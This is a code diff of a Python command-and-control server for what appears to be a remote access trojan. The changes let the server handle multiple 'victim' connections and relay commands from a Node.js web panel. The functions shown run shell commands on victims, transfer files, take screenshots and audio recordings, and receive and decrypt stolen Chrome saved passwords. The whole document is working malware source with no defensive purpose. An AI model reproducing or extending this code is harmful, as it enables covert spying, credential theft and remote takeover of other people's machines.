@@ -1,5 +1,7 @@
 import socket
 import threading
+from _thread import *
+import json
 import os
 import json
 import base64
@@ -14,18 +16,20 @@ class Server:
     ip = None
     listen_count = None
     client_name = ''
+    sockets_ip = {}
 
     def __init__(self, port, ip, listen_count, client_name):
         self.port = port
         self.ip = ip
         self.listen_count = listen_count
         self.client_name = client_name
+        self.s = socket.socket()
+        self.s.bind(('0.0.0.0', self.port))
+        self.s.listen(self.listen_count)
 
     def start_server_listen(self):
-        self.s = socket.socket()
-        self.s.bind((self.ip, self.port))
-        self.s.listen(self.listen_count)
-        self.server_socket, self.adress = self.s.accept()
+        pass
+        # self.server_socket, self.adress = self.s.accept()
 
     def connect_to_web(self):
         self.sock = socket.socket()
@@ -33,12 +37,13 @@ class Server:
         self.sock.listen(self.listen_count)
         self.sock.listen(1)
         self.web_server_socket, self.web_adress = self.sock.accept()
+        print('connected to node.js')
+
 
     def runThread(self):
-        self.start_server_listen()
-        print('connected to victim')
         self.connect_to_web()
-        print('connected to node.js')
+        # self.start_server_listen()
+        # print('connected to victim')
         self.get_command_from_server()
 
     def get_chrome_datetime(self, chromedate):
@@ -115,7 +120,7 @@ class Server:
         db.close()
         return content
 
-    def receive_file_from_client(self, path_to_save):
+    def receive_file_from_client(self, path_to_save, sock):
 
         # Take from the victim file
         if path_to_save == "":
@@ -126,7 +131,7 @@ class Server:
             print('Open File')
             self.web_server_socket.send("Open File".encode())
             while True:
-                data = self.server_socket.recv(1024)
+                data = sock.recv(1024)
                 if not data or len(data) < 1024:
                     if data:
                         f.write(data)
@@ -137,48 +142,65 @@ class Server:
         print('done')
         self.web_server_socket.send('Done!'.encode())
 
-    def send_file_to_client(self, data):
+    def send_file_to_client(self, data, sock):
         # Send to the victim files
         self.web_server_socket.send("Whete do you want to save the file".encode())
         victim_path = self.web_server_socket.recv(1024).decode()  # input('Where do you want save the file\n')
-        self.server_socket.sendall(victim_path.encode('utf-8'))
+        sock.send(victim_path.encode('utf-8'))
         f = open(data, 'rb')
         while True:
             content = f.read(1024)
             if content:
-                self.server_socket.sendall(content)
+                sock.send(content)
             else:
                 f.close()
                 break
         self.web_server_socket.send("The file was sent to the victim successfully!".encode())
 
     def get_command_from_server(self):
+        start_new_thread(self.wait_for_connections, ())
         while True:
-            command = self.web_server_socket.recv(1024).decode()
-            self.run_command(command)
+            try:
+                command = json.loads(self.web_server_socket.recv(1024).decode())
+                print(command)
+                self.run_command(command[0], self.sockets_ip[command[1]])
+            except socket.error as e:
+                del self.web_server_socket
+                print("There is an error")
+                print(e)
+                self.connect_to_web()
+                continue
 
-    def run_command(self, command):
+    def wait_for_connections(self):
+        while True:
+            sock, addr = self.s.accept()
+            print("New  connection")
+            print(addr[0])
+            self.sockets_ip[addr[0]] = sock
+            self.web_server_socket.send(('Connected$ ' + addr[0]).encode())
+
+    def run_command(self, command, sock):
         print("test")
         print(command)
         data = None
-        self.server_socket.send(command.encode('utf-8'))
+        sock.send(command.encode('utf-8'))
 
         # recv file (file name on victim computer)
         if command.startswith('recv file'):
-            self.receive_file_from_client("")
+            self.receive_file_from_client("", sock)
 
         # for sending mcd commands to victim computer
         elif command.startswith("cmd"):
-            data = self.server_socket.recv(2048)
+            data = sock.recv(2048)
             print(data.decode('utf-8', 'ignore'))
             self.web_server_socket.send(data)
 
 
 
         elif command.startswith("get files"):
-            data = self.server_socket.recv(20)
+            data = sock.recv(20)
             try:
-                data = self.server_socket.recv(int(data.decode()))
+                data = sock.recv(int(data.decode()))
                 print(data.decode())
             except:
                 print(data)
@@ -186,43 +208,43 @@ class Server:
 
         elif command.startswith('download file '):
             command = command[14:-1] + command[-1]
-            self.send_file_to_client(command)
+            self.send_file_to_client(command, sock)
 
 
         elif command.startswith('take record '):
             command = command[12:-1] + command[-1]
-            self.server_socket.sendall(command.encode('utf-8'))
+            sock.send(command.encode('utf-8'))
             path = input("Where do you want save the file on victim computer\n")
-            self.server_socket.sendall(path.encode('utf-8'))
-            self.receive_file_from_client("")
+            sock.send(path.encode('utf-8'))
+            self.receive_file_from_client("", sock)
 
         elif command.startswith("get chrome passwords"):
-            self.receive_file_from_client("ChromeKey")
-            self.receive_file_from_client("ChromeData")
+            self.receive_file_from_client("ChromeKey", sock)
+            self.receive_file_from_client("ChromeData", sock)
             self.web_server_socket.send(self.decode_chrome_passwords().encode())
 
         elif command.startswith('take screenshot '):
-            self.receive_file_from_client("")
+            self.receive_file_from_client("", sock)
 
         elif command == 'exit':
             return
 
         elif command.startswith('listen'):
-            self.receive_file_from_client("")
+            self.receive_file_from_client("", sock)
 
         elif command == 'exit':
-            self.server_socket.close()
+            sock.close()
             pass
 
         elif command == 'q':
             print("quitting")
-            self.server_socket.close()
+            sock.close()
             self.web_server_socket.close()
             self.web_server_socket.send("Quitting!".encode())
             quit(1)
 
         else:
-            data = self.server_socket.recv(1024).decode('utf-8')
+            data = sock.recv(1024).decode('utf-8')
             print(data)
             self.web_server_socket.send(data.encode())
             return
@@ -230,14 +252,16 @@ class Server:
     # self.server_socket.close()
 
 
-myServer = Server(7613, '127.0.0.1', 1, 'client1')
-myServer2 = Server(9999, '127.0.0.1', 1, 'client2')
+myServer = Server(9999, '127.0.0.1', 1, 'client1')
+myServer.runThread()
 
-t1 = threading.Thread(target=myServer.runThread, args=())
-t2 = threading.Thread(target=myServer2.runThread, args=())
-
-t1.start()
-t2.start()
-
-t1.join()
-t2.join()
+# myServer2 = Server(9999, '127.0.0.1', 1, 'client2')
+#
+# t1 = threading.Thread(target=myServer.runThread, args=())
+# t2 = threading.Thread(target=myServer2.runThread, args=())
+#
+# t1.start()
+# t2.start()
+#
+# t1.join()
+# t2.join()
